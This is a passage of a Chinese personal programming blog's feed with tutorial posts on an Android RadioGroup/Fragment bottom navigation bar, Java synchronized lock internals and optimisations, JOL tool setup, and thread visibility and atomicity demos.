class="token namespace">android:</span>orientation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>horizontal<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>padding</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5dp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        &lt;RadioButton            android:id="@+id/main_rb_star"            android:drawableTop="@drawable/main_rb_star"            android:text="@string/label_star"            android:checked="true"            <span class="token comment" spellcheck="true">&lt;!--由于四个按钮下面的属性可以直接封装到style里面进行模块化管理 --></span>            android:layout_width="0dp"            android:layout_height="match_parent"            android:layout_weight="1"            <span class="token comment" spellcheck="true">&lt;!--这里一定要设置成@null才会有按钮的效果 --></span>            android:button="@null"            android:checked="true"            android:gravity="center            android:textSize="12sp"            android:drawablePadding="2dp"            android:textColor="@drawable/main_rbtxt"            />            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RadioGroup</span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!--中间部分用布局占位,会去使用Fragmentt替换这块布局--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LinearLayout</span>        <span class="token attr-name"><span class="token namespace">android:</span>id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@+id/main_layout_center<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>orientation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vertical<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_below</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@+id/main_tv_title<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_above</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@+id/main_rg<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p><strong><em>上面的代码总体是在RelativeLayout下进行布局的,！！！！<br> 背景颜色和图片等属性自行调整,想要有图片的效果只要加四个RadioButton即可</em></strong>  </p><p><strong><em>注意:<br>    1.layout_alignParentBottom可以让到导航栏位于底部<br>    2.Group中的padding值可以让导航栏的button分开<br>    3.直接前嵌套多个RadioButton他们回自动评分导航栏<br>    4.button的属性值设置成@null才能有按钮的特效<br>    5.用drawableTop可以将button换成图片,然后直接设置text还有gravity可以实现文字自动居于图片下方<br>    6.想要设置选中和非选中状态文字颜色和图片(textcolor和drawbleTop)：要在drawable中创建一个xml文件,然后设置不同check状态下的情况,改图片用android:drawable,改颜色用android:color</em></strong><br>    <img src="https://i.loli.net/2020/07/25/DWkZejTna9PMwcA.png" alt="自定义不同check状态下的图片"><br>    <strong><em>7.中间部分用布局占位,会去使用Fragmentt替换这块布局</em></strong>   </p><h2 id="二-Fragment页面切换"><a href="#二-Fragment页面切换" class="headerlink" title="二.Fragment页面切换"></a>二.Fragment页面切换</h2><p>1.新建Fragment(同时新建对应的xml文件)<br>2.创建碎片对象(每一项都按照下面的代码写)</p><pre><code>    Fragment starFrag    starFrag=new StarFragment();    //StarFragment是1中创建的Fragment的类名</code></pre><p>3.创建一个addFragmentPage()函数来加载四个Fragment  </p><pre><code>    private void addFragmentPage() {          //1.创建碎片管理者(manager是声明的全局的FragmnentManager的对象)          manager = getSupportFragmentManager();           ////2.创建碎片处理事务对象        FragmentTransaction transaction=manager.beginTransaction();        //3.将四个Fragment统一的添加到布局当中        //add的第一个参数是要布局的区域,第二个是要布局的Fragment对象        transaction.add(R.id.main_layout_center,starFrag);        transaction.add(R.id.main_layout_center,partnerFrag);        transaction.add(R.id.main_layout_center,luckFrag);        transaction.add(R.id.main_layout_center,meFrag);          //4.因为初始的时候第一项时亮的,所以其他的隐藏           transaction.hide(partnerFrag);        transaction.hide(luckFrag);        transaction.hide(meFrag);        //5.//5.提交碎片改变后的事务        transaction.commit();}</code></pre><p> 4.添加点击事件(onCheckedChanged)      </p><pre><code>    @Overridepublic void onCheckedChanged(RadioGroup group, int checkedId) {    FragmentTransaction transaction=manager.beginTransaction();    switch (checkedId){        case R.id.main_rb_star:            transaction.hide(partnerFrag);            transaction.hide(luckFrag);            transaction.hide(meFrag);            transaction.show(starFrag);            break;        case R.id.main_rb_partner:            transaction.hide(starFrag);            transaction.hide(luckFrag);            transaction.hide(meFrag);            transaction.show(partnerFrag);            break;        case R.id.main_rb_luck:            transaction.hide(partnerFrag);            transaction.hide(starFrag);            transaction.hide(meFrag);            transaction.show(luckFrag);            break;        case R.id.main_rb_me:            transaction.hide(partnerFrag);            transaction.hide(luckFrag);            transaction.hide(starFrag);            transaction.show(meFrag);            break;    }        transaction.commit();}     </code></pre><h2 id="三-细节问题"><a href="#三-细节问题" class="headerlink" title="三.细节问题"></a>三.细节问题</h2><h3 id="一-RadioGroup的点击事件"><a href="#一-RadioGroup的点击事件" class="headerlink" title="一.RadioGroup的点击事件"></a>一.RadioGroup的点击事件</h3><p>两种设置方式<img src="https://i.loli.net/2020/07/25/NnKLJucrm5PpX8l.png" alt="方式一"><br><img src="https://i.loli.net/2020/07/25/RJgIomUTvsxdD8S.png" alt="方式二"><br>方式一 : 直接通过匿名对象的方式传参数给点击事件监听器<br>方式二 : 通过调用点击事件接口的形式,在外部重写方法(应为此时MainActivity是Listener的实现类)<br>显然,方式二看上去回更简洁一些,更容易看出代码逻辑</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android开发 </tag>
            
            <tag> UI布局 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>synchronized关键字(二)</title>
      <link href="/2020/07/22/synchronized-guan-jian-zi-er/"/>
      <url>/2020/07/22/synchronized-guan-jian-zi-er/</url>
      
        <content type="html"><![CDATA[<h2 id="emsp-一-monitor的JVM源码深入解析"><a href="#emsp-一-monitor的JVM源码深入解析" class="headerlink" title=" 一.monitor的JVM源码深入解析"></a> 一.monitor的JVM源码深入解析</h2><p><img src="https://i.loli.net/2020/07/22/BSqiyrktVT1zaCw.png" alt="JVM源码"></p><h3 id="一-代码解析："><a href="#一-代码解析：" class="headerlink" title="一.代码解析："></a>一.代码解析：</h3><p>  1.在多个线程竞争锁的时候,线程1如果抢到锁,那么后面时刻进来的其他线程就会进入_cxq这个单向列表里等着(处在block状态),当线程一执行完一次同步代码块之后,如果此时依旧是线程1抢到了锁,那么单项列表里线程会被加到_EntryList这个列表中  </p><h3 id="二-monitor竞争"><a href="#二-monitor竞争" class="headerlink" title="二.monitor竞争"></a>二.monitor竞争</h3><p><img src="https://i.loli.net/2020/07/23/sn4GTgMzZIjbJ5p.png" alt="源码位置"></p><p> 1.代码含义<br> 从源码中我们可以得出以下结论(在(一)中提到过了):<br> ①有新线程进入synchronized时,通过CAS操作把owner字段设置成当前线程<br> ②recursions遇到进入sychronized的”{“就会+1,出去的时候减1,对于重入锁,recursions可记录重入的次数<br> ③第一次进入的线程,owner会改为该线程,recursions会赋成1<br> ④如果获取锁失败,则等待锁的释放  </p><h3 id="三-monitor等待"><a href="#三-monitor等待" class="headerlink" title="三.monitor等待"></a>三.monitor等待</h3><p><img src="https://i.loli.net/2020/07/23/fAospXhJcNqgOb2.png" alt="源码位置"><br><img src="https://i.loli.net/2020/07/23/NEvpMwfjFi4DqnR.png" alt="代码概括"></p><h3 id="四-monitor释放"><a href="#四-monitor释放" class="headerlink" title="四.monitor释放"></a>四.monitor释放</h3><p><img src="https://i.loli.net/2020/07/23/ZNnmR8I3UebjMiF.png" alt="源码位置"><br><img src="https://i.loli.net/2020/07/23/2COuLacbdFHAq6t.png" alt="代码概括"></p><h3 id="五-monitor是重量级锁"><a href="#五-monitor是重量级锁" class="headerlink" title="五.monitor是重量级锁"></a>五.monitor是重量级锁</h3><p><img src="https://i.loli.net/2020/07/23/mBNJsKiUqtd8fHQ.png" alt="Linx系统体系架构"><br><img src="https://i.loli.net/2020/07/23/VAWI4ayxzNJjlKP.png" alt="解析"><br>注:正是由于内核态和用户态的的频繁切换,导致synchronized效率很低</p><h2 id="二-CAS简介"><a href="#二-CAS简介" class="headerlink" title="二.CAS简介"></a>二.CAS简介</h2><h3 id="emsp-1-CAS概述和作用"><a href="#emsp-1-CAS概述和作用" class="headerlink" title=" 1.CAS概述和作用"></a> 1.CAS概述和作用</h3><p><img src="https://i.loli.net/2020/07/23/IrGSsoJkLOPTvYa.png" alt=""><br><img src="https://i.loli.net/2020/07/23/tIvJz456ngxQryj.png" alt="代码"><br>内存中的值,旧的预估值和要改的新值之间的关系是,如果内存值和预估值不同,就一直在while循环中进行比较,如果相同,就赋给新值</p><h3 id="emsp-2-乐观锁和悲观锁"><a href="#emsp-2-乐观锁和悲观锁" class="headerlink" title=" 2.乐观锁和悲观锁"></a> 2.乐观锁和悲观锁</h3><p><img src="https://i.loli.net/2020/07/23/imhNGwOpU5FnD9s.png" alt=""><br><strong><em>总结:<br> ①悲观锁会造成线程阻塞,性能差<br> ②乐观锁的处理机制是判断别人有没有改过数据,如果没人改就自己更新,有人改就重试,总体性能较好<br> ③乐观锁适用于竞争不激烈,多核CPU的场景下,因为如果不断重试效率可能还不如synchronized</em></strong></p><h2 id="三-synchronized优化"><a href="#三-synchronized优化" class="headerlink" title="三.synchronized优化"></a>三.synchronized优化</h2><h3 id="emsp-一-Java对象布局细节"><a href="#emsp-一-Java对象布局细节" class="headerlink" title=" 一.Java对象布局细节"></a> 一.Java对象布局细节</h3><h4 id="emsp-1-对象布局"><a href="#emsp-1-对象布局" class="headerlink" title=" 1.对象布局"></a> 1.对象布局</h4><p><img src="https://i.loli.net/2020/07/23/dSPG3JvkHDxuUA4.png" alt=""><br><strong><em>实例数据:也就是在对象中声明的变量等数据</em></strong>  </p><p><strong><em>对齐数据:由于字节位数的关系,一个对象的字节数必须是8的整数倍。例如 : 一个对象内存总共是13字节,那么为了对齐数据,总内存会占16字节,补充了3字节</em></strong></p><p><strong><em>对象头:每个对象生来就有的,对象头主要分为Mark Word和Klass pointer(类型指针)</em></strong></p><h3 id="2-对象头的大小"><a href="#2-对象头的大小" class="headerlink" title="2.对象头的大小"></a>2.对象头的大小</h3><p><img src="https://i.loli.net/2020/07/23/rAIYV1SmTCPdOJg.png" alt=""><br>用JOL工具包显示出的对象头大小结果（平时是IDA默认是开启指针压缩的）:<br><img src="https://i.loli.net/2020/07/23/dkKIyU6Eh7MDFsQ.png" alt="指针压缩时"><br><img src="https://i.loli.net/2020/07/23/QbfvLnYwI3OSAyB.png" alt="取消指针压缩时"><br>由于平时默认指针压缩时开着的,如果开启了指针压缩,那么会占,12字节,Klass Pointer会被压缩4个字节(由上图比较可以发现)  </p><p><img src="https://i.loli.net/2020/07/23/fHa4IdJu5qSLzON.png" alt="Klass pointer详解"></p><h3 id="3-关于JOL工具包显示结果中Value值的含义"><a href="#3-关于JOL工具包显示结果中Value值的含义" class="headerlink" title="3.关于JOL工具包显示结果中Value值的含义"></a>3.关于JOL工具包显示结果中Value值的含义</h3><p><img src="https://i.loli.net/2020/07/23/JLXQkDx7zMV19gO.png" alt="Mark Word的存储结构"><br><img src="https://i.loli.net/2020/07/23/3IXJNsOeBogDZUM.png" alt=""><br>输出obj.hashCode之后可以发现,由于hashCode的高位对应value的低位(小端存储)</p><hr><h2 id="四-锁"><a href="#四-锁" class="headerlink" title="四.锁"></a>四.锁</h2><p><strong><em>锁的进化过程:无锁–&gt;偏向锁–&gt;轻量级锁–&gt;重量级锁</em></strong></p><h3 id="一-偏向锁"><a href="#一-偏向锁" class="headerlink" title="一.偏向锁"></a>一.偏向锁</h3><h4 id="1-引入偏向锁的目的"><a href="#1-引入偏向锁的目的" class="headerlink" title="1.引入偏向锁的目的"></a>1.引入偏向锁的目的</h4><p> 由于实践中通常程序第一个线程会被多次调用,所以出现了偏向锁</p><h4 id="2-基本原理"><a href="#2-基本原理" class="headerlink" title="2.基本原理"></a>2.基本原理</h4><p>  当线程第一次访问同步块并获取锁时，偏向锁处理流程如下：<br>①虚拟机将会把对象头中的标志位设为“01”，即偏向模式。<br>②同时使用CAS操作把获取到这个锁的线程的ID记录在对象的Mark Word之中 ，如果CAS操作成功，持有偏向锁的线程以后每次进入这个锁相关的同步块时，虚拟机都可以不再进行任何同步操作，偏向锁的效率高。  </p><h4 id="3-偏向锁的撤销"><a href="#3-偏向锁的撤销" class="headerlink" title="3.偏向锁的撤销"></a>3.偏向锁的撤销</h4><p>①偏向锁的撤销动作必须等待全局安全点(所有线程都停下来的时候)<br>②暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态<br>③撤销偏向锁，恢复到无锁（标志位为 01）或轻量级锁（标志位为 00）的状态  </p><p>偏向锁在Java 6之后是默认启用的，但在应用程序启动几秒钟之后才激活，可以使用XX:BiasedLockingStartupDelay=0 参数关闭延迟，如果确定应用程序中所有锁通常情况下处于竞争 状态，可以通过 XX:-UseBiasedLocking=false 参数关闭偏向锁。</p><h4 id="4-偏向锁的好处与不足"><a href="#4-偏向锁的好处与不足" class="headerlink" title="4.偏向锁的好处与不足"></a>4.偏向锁的好处与不足</h4><p>好处:  适用于只有一个线程反复多次拿到同一把锁的情况(竞争不强),提高性能<br>不足： 如果竞争太过强烈，比如开线程池导致一把锁被多个线程访问,那么偏模式就是多余的 </p><hr><h3 id="二-轻量级锁"><a href="#二-轻量级锁" class="headerlink" title="二.轻量级锁"></a>二.轻量级锁</h3><p><img src="https://i.loli.net/2020/07/23/zflbAcPaVq6dC1S.png" alt="原理示意图"></p><p> 栈帧 : 一个进入栈的方法就是一个栈帧</p><p><img src="https://i.loli.net/2020/07/23/JLXQkDx7zMV19gO.png" alt="Mark Word的存储结构"></p><h4 id="1-基本原理-见上图和下文文字说明"><a href="#1-基本原理-见上图和下文文字说明" class="headerlink" title="1.基本原理(见上图和下文文字说明)"></a>1.基本原理(见上图和下文文字说明)</h4><p> 1. 判断当前对象是否处于无锁状态（hashcode、0、01），如果是，则JVM首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间，用于存储锁对象目前的Mark Word的拷贝（官方把这份拷贝加了一个Displaced前缀，即Displaced Mark Word），将对象的Mark Word复制到栈帧中的Lock Record中，将Lock Reocrd中的owner指向当前对象。<br> 2. JVM利用CAS操作尝试将对象的Mark Word更新为指向Lock Record的指针，如果成功表示竞争到锁，则将锁标志位变成00，执行同步操作。<br> 3. 如果失败则判断当前对象的Mark Word是否指向当前线程的栈帧(查看是否当前已经指向了)，如果是则表示当前线程已经持有当前对象的锁，则直接执行同步代码块；否则只能说明该锁对象已经被其他线程抢占了**(出现竞争)，这时轻量级锁需要膨胀为重量级锁，锁标志位变成10，后面等待的线程将会进入阻塞状态。 </p><p><strong><em>原理总结</em></strong>：<br><strong><em> 1.栈帧中生成LockRecord获取Mark Word的信息,Mark Word指向LockRecord指向的地址，并LockRecord中的owner标记锁<br> 2.指针修改成功则锁标志位改成00,若修改失败,则判断是否已经指向当前栈帧(即值是否相等),若相等则竞争到锁,执行同步代码块,否则等待转化为重量级锁(出现竞争状态)</em></strong></p><h4 id="2-引入轻量级锁的目的"><a href="#2-引入轻量级锁的目的" class="headerlink" title="2.引入轻量级锁的目的"></a>2.引入轻量级锁的目的</h4><p> 多个线程交替执行时,利用轻量级锁来提高性能<br> <strong><em>注意 ：这里指的时交替执行而不是竞争,如果多个线程同时进入临界区,会导致轻量级锁膨胀升级重量级锁，所以轻量级锁的出现并非是要 替代重量级锁。这个两个不同的概念</em></strong></p><h4 id="3-轻量级锁的释放-生成的逆过程"><a href="#3-轻量级锁的释放-生成的逆过程" class="headerlink" title="3.轻量级锁的释放(生成的逆过程)"></a>3.轻量级锁的释放(生成的逆过程)</h4><p> 1.取数据： 取出在获取轻量级锁保存在Displaced Mark Word中的数据。<br> 2.换数据 用CAS操作将取出的数据替换当前对象的Mark Word中，如果成功，则说明释放锁成功。<br> 3.释放失败则锁升级 如果CAS操作替换失败，说明有其他线程尝试获取该锁，则需要将轻量级锁需要膨胀升级为重量级锁。  </p><p><strong><em>疑惑：为什么会CAS操作失败说明其他线程尝试获取该锁</em></strong><br>   <strong><em>百度解释：这里说一下轻量级锁释放失败是就证明锁升级的原理，因为之前 mark word 指向的是本线程的指针，这个是 cas 期望的值，但是被其他线程更改为了指向互斥量的对象了，cas 就失败，就证明升级为了重量级锁。<a href="https://zhuanlan.zhihu.com/p/155637411" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/155637411</a></em></strong></p><h4 id="4-轻量级锁的好处和弊端"><a href="#4-轻量级锁的好处和弊端" class="headerlink" title="4.轻量级锁的好处和弊端"></a>4.轻量级锁的好处和弊端</h4><p>好处：在多线程交替执行同步块的情况下，可以避免重量级锁引起的性能消耗。<br>弊端：对于轻量级锁，其性能提升的依据是“对于绝大部分的锁，在整个生命周期内都是不会存在竞争的”，如 果打破这个依据则除了互斥的开销外，还有额外的CAS操作，因此在有多线程竞争的情况下，轻量级锁 比重量级锁更慢。 </p><h3 id="三-自旋锁"><a href="#三-自旋锁" class="headerlink" title="三.自旋锁"></a>三.自旋锁</h3><h4 id="1-自旋锁的原理"><a href="#1-自旋锁的原理" class="headerlink" title="1.自旋锁的原理"></a>1.自旋锁的原理</h4><p>前面我们讨论monitor实现锁的时候，知道monitor会阻塞和唤醒线程，线程的阻塞和唤醒需要CPU从 用户态转为核心态，频繁的阻塞和唤醒对CPU来说是一件负担很重的工作，这些操作给系统的并发性能 带来了很大的压力。同时，虚拟机的开发团队也注意到在许多应用上，共享数据的锁定状态只会持续很 短的一段时间，为了这段时间阻塞和唤醒线程并不值得。如果物理机器有一个以上的处理器，能让两个 或以上的线程同时并行执行，我们就可以让后面请求锁的那个线程“稍等一下”，但不放弃处理器的执行 时间，看看持有锁的线程是否很快就会释放锁。为了让线程等待，我们只需让线程执行一个忙循环(自 旋) , 这项技术就是所谓的自旋锁<br>自旋锁在JDK 1.4.2中就已经引入 ，只不过默认是关闭的，可以使用-XX:+UseSpinning参数来开启，在 JDK 6中 就已经改为默认开启了。自旋等待不能代替阻塞，且先不说对处理器数量的要求，自旋等待本 身虽然避免了线程切换的开销，但它是要占用处理器时间的，因此，如果锁被占用的时间很短，自旋等 待的效果就会非常好，反之，如果锁被占用的时间很长。那么自旋的线程只会白白消耗处理器资源，而 不会做任何有用的工作，反而会带来性 能上的浪费。因此，自旋等待的时间必须要有一定的限度，如果在多线程交替执行同步块的情况下，可以避免重量级锁引起的性能消耗。自旋超过了限定的次数仍然没有成功获得锁，就应当使用传统的方式去挂起线程了。自旋次数的默认值 是10次，用户可以使用参数-XX : PreBlockSpin来更改。 </p><p><strong><em>总结:</em></strong>  </p><p><strong><em>由于重量级锁及其浪费性能,所以在升级成重量级锁之前会先自旋试试看能不能拿到锁,可以剩下线程阻塞和唤醒线程的时间</em></strong>  </p><p><strong><em>就好比你去找别人,到别人家门口了,发现敲了一次们之后没人,如果你间断性的敲门(相当于自旋),可能门一会儿就开了,如果你回家等着等到那个人通知你说门开了再过去,明显前者效率更优</em></strong></p><h4 id="2-适应性自旋锁"><a href="#2-适应性自旋锁" class="headerlink" title="2.适应性自旋锁"></a>2.适应性自旋锁</h4><p>在JDK 6中引入了自适应的自旋锁。自适应意味着自旋的时间不再固定了，而是由前一次在同一个锁上 的自旋时间及锁的拥有者的状态来决定。如果在同一个锁对象上，自旋等待刚刚成功获得过锁，并且持 有锁的线程正在运行中，那么虚拟机就会认为这次自旋也很有可能再次成功，进而它将允许自旋等待持 续相对更长的时间，比如100次循环。另外，如果对于某个锁，自旋很少成功获得过，那在以后要获取 这个锁时将可能省略掉自旋过程，以避免浪费处理器资源。有了自适应自旋，随着程序运行和性能监控 信息的不断完善，虚拟机对程序锁的状况预测就会越来越准确，虛拟机就会变得越来越“聪明”了。 </p><p><strong><em>总结:</em></strong> </p><p><strong><em>虚拟机会根据你之前拿到锁所需要的自旋次数来自适应的选出一个较优方案,如果自旋次数很大,就会自动转入重量级锁,如果较小,那么下次自旋会给出一个比这次大一点点的自旋数</em></strong>    </p><h3 id="五-锁消除和锁粗化"><a href="#五-锁消除和锁粗化" class="headerlink" title="五.锁消除和锁粗化"></a>五.锁消除和锁粗化</h3><p>精确定义：锁消除是指虚拟机即时编译器（JIT）在运行时，对一些代码上要求同步，但是被检测到不可能存在共享 数据竞争的锁进行消除。锁消除的主要判定依据来源于逃逸分析的数据支持，如果判断在一段代码中， 堆上的所有数据都不会逃逸出去从而被其他线程访问到，那就可以把它们当做栈上数据对待，认为它们 是线程私有的，同步加锁自然就无须进行。变量是否逃逸，对于虚拟机来说需要使用数据流分析来确 定，但是程序员自己应该是很清楚的，怎么会在明知道不存在数据争用的情况下要求同步呢?实际上有 许多同步措施并不是程序员自己加入的，同步的代码在Java程序中的普遍程度也许超过了大部分读者的 想象。下面这段非常简单的代码仅仅是输出3个字符串相加的结果，无论是源码字面上还是程序语义上 都没有同步。</p><p><strong><em>总结：</em></strong>  </p><p><strong><em>锁消除：如果代码时不需要同步,但是你加了sychronized,那么程序会自动把synchronized忽略掉,这样就省去了同步的时间,提高效率</em></strong> </p><p><strong><em>锁粗化：JVM会探测到一连串细小的操作都使用同一个对象加锁，将同步代码块的范围放大，放到这串操作的外面，这样只需要加一次锁即可。<br>比如：synchronized放在for循环的内部和外部不影响结果,那么如果你放在内部的话会影响程序效率,这时候程序会把synchronized优化放到外面去,这样只需要进入同步代码块一次即可</em></strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 线程 </category>
          
          <category> 线程安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
            <tag> synchronized </tag>
            
            <tag> 锁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java内存模型</title>
      <link href="/2020/07/21/java-nei-cun-mo-xing/"/>
      <url>/2020/07/21/java-nei-cun-mo-xing/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JOL的安装</title>
      <link href="/2020/07/21/openjdk14-de-an-zhuang-he-jol-de-shi-yong/"/>
      <url>/2020/07/21/openjdk14-de-an-zhuang-he-jol-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>下载 jol 工具包<br><a href="https://repo.maven.apache.org/maven2/org/openjdk/jol/jol-cli/" target="_blank" rel="noopener">https://repo.maven.apache.org/maven2/org/openjdk/jol/jol-cli/</a><br>选择一个版本，进去后下载 jol-cli-<em>.</em>-full.jar  一定要下载full 的jar</p><p>导入包</p><p>然后在maven的pom.xml中添加依赖</p><pre><code>    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.openjdk.jol&lt;/groupId&gt;            &lt;artifactId&gt;jol-core&lt;/artifactId&gt;            &lt;version&gt;0.9&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>对于intellij而言,还要在Project Structure的Dependency中加入下好的JOL工具的jar包即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 第三方工具安装配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三方工具安装配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>synchronized关键字(一)</title>
      <link href="/2020/07/21/synchronized-guan-jian-zi/"/>
      <url>/2020/07/21/synchronized-guan-jian-zi/</url>
      
        <content type="html"><![CDATA[<h2 id="一-并发编程的三大问题"><a href="#一-并发编程的三大问题" class="headerlink" title="一.并发编程的三大问题"></a>一.并发编程的三大问题</h2><h3 id="一-可见性"><a href="#一-可见性" class="headerlink" title="一.可见性"></a>一.可见性</h3><h4 id="emsp-1-概念"><a href="#emsp-1-概念" class="headerlink" title=" 1.概念:"></a> 1.概念:</h4><p> 对于共享数据,一个线程对该数据的值进行修改后另一个线程无法得到修改后的值  </p><h4 id="emsp-2-代码演示："><a href="#emsp-2-代码演示：" class="headerlink" title=" 2.代码演示："></a> 2.代码演示：</h4><pre><code>public class Test1 {private static boolean flag=true;public static void main(String[] args) throws InterruptedException {    new Thread(){        @Override        public void run() {            while (flag){                ;            }            System.out.println("flag已修改");        }    }.start();    Thread.sleep(2000);    new Thread(){        @Override        public void run() {            flag=false;            System.out.println("已经被我修改");            }        }.start();    }}  </code></pre><p> 运行结果：<img src="https://i.loli.net/2020/07/22/vYbSzhJt4VXW5RF.png" alt=""><br> <strong><em>不难发现,当线程二将flag改为true的时候线程一并不能提前得到最新数据,导致程序依旧停留在while循环中</em></strong>  </p><h4 id="3-原因分析"><a href="#3-原因分析" class="headerlink" title="3.原因分析"></a>3.原因分析</h4><p> <br><img src="https://i.loli.net/2020/07/22/wtyEl7iIvfadGxz.png" alt="内存模型"><br> 线程工作原理:在线程操作变量时,会先将主内存中的变量拷贝到工作内存中,然后对工作内存中的拷贝变量进行赋值计算等操作,操作完之后再赋值给主内存  </p><p> 分析:比如示例代码的上下两个线程分别表示线程1和线程2,线程一的工作内存复制的值是true,当线程2将flag改为false并且赋给主内存后,线程一并不会去读取主内存中的值,这也就导致了线程一卡在while循环无法出来</p><h4 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4.解决方法"></a>4.解决方法</h4><p> 方式一：用volatile修饰共享变量<br> 原理：被volatile修饰的变量,当主内存中该变量被别的线程二改变时,会将工作内存中的变量全部作废,这样线程一要重新向主内存中去读取数据的值  </p><p>给flag添加了volatile之后代码的运行结果：</p><p><img src="https://i.loli.net/2020/07/22/JG7PLNXIlZrY6DW.png" alt="">  </p><p>  方式二：用synchronized来保证可见性<br>仅就红色区域为新添的代码(synchronized的参数要放一个对象),也能解决这个问题<br><img src="https://i.loli.net/2020/07/22/WHw6Gop87BEaSON.png" alt="">  </p><p>原理分析：<br>sychronized的时候会有lock和unlock的操作,在lock的时候会刷新当前线程工作内存中的值,实现工作内存及时读取最新的数据值<br><img src="https://i.loli.net/2020/07/22/ODvapBmMls3Z2Xu.png" alt=""></p><p>补充：正因为如此,所以如果仅仅只在while循环中加一句</p><pre><code> System.out.println("true");</code></pre><p>最后的也能退出循环,因为println的源码中有用到synchronized<br><img src="https://i.loli.net/2020/07/22/TOuj3JhNRZVfDG8.png" alt=""></p><h3 id="二-原子性"><a href="#二-原子性" class="headerlink" title="二.原子性"></a>二.原子性</h3><h4 id="emsp-1-概念-1"><a href="#emsp-1-概念-1" class="headerlink" title=" 1.概念:"></a> 1.概念:</h4><p> 在一次或多次操作中,要么所有操作都执行，而且不会因为互相干扰出现异常结果,要么都不执行      (经典抢车票中的线程安全问题)</p><h4 id="emsp-2-代码演示-代码选自-创建多线程的四种方式中的方式二"><a href="#emsp-2-代码演示-代码选自-创建多线程的四种方式中的方式二" class="headerlink" title=" 2.代码演示(代码选自 创建多线程的四种方式中的方式二):"></a> 2.代码演示(代码选自 <a href="https://1766095699.github.io/2020/07/19/jin-cheng-yu-xian-cheng/">创建多线程的四种方式中的方式二</a>):</h4><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//1.创建一个实现Runnable接口的类</span>    <span class="token keyword">class</span> <span class="token class-name">Mythread</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> ticket<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//2.重写run方法</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ticket<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token 